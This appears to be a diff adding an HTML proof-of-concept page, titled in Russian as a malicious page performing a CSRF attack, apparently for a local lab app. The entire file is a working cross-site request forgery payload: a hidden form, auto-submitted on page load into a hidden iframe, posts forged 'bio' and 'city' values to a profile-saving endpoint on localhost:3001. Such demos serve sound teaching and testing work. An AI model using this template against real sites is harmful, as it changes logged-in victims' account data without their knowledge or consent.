@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Злонамеренная страница</title>
+</head>
+<body>
+    <h1>Эта страница выполняет CSRF атаку</h1>
+    <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+    <form id="csrf-form" action="http://localhost:3001/saveInfo" method="POST" target="dummyframe">
+        <input type="hidden" name="bio" value="attackedBio1" />
+        <input type="hidden" name="city" value="attackedCity1" />
+    </form>
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
